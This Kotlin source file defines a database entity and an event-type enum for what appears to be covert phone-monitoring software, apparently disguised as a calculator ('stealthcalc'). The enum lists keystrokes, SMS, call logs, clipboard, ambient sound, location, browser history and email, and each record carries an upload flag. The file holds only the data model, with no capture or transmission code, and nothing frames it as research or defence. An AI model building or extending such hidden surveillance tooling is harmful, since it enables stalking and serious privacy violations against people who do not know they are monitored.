package com.stealthcalc.monitoring.model

import androidx.room.Entity
import androidx.room.PrimaryKey
import java.util.UUID

enum class MonitoringEventKind {
    APP_USAGE,
    SCREEN_EVENT,
    BATTERY,
    NETWORK,
    APP_INSTALL,
    NOTIFICATION,
    LOCATION,
    DEVICE_STATE,
    CALL_LOG,
    SMS,
    MEDIA_ADDED,
    SECURITY_EVENT,
    CLIPBOARD,
    KEYSTROKE,
    WIFI_HISTORY,
    BROWSER_HISTORY,
    SIM_CHANGE,
    DEVICE_INFO,
    DATA_USAGE,
    CALENDAR_EVENT,
    GEOFENCE,
    INSTALLED_APPS,
    AMBIENT_SOUND,
    CONTACT_FREQUENCY,
    STEP_COUNT,
    SENSOR_DATA,
    APP_PERMISSIONS,
    EMAIL_MONITORING,
}

@Entity(tableName = "monitoring_events")
data class MonitoringEvent(
    @PrimaryKey val id: String = UUID.randomUUID().toString(),
    val kind: MonitoringEventKind,
    val payload: String,
    val capturedAt: Long = System.currentTimeMillis(),
    val uploaded: Boolean = false,
    val uploadedAt: Long? = null,
)
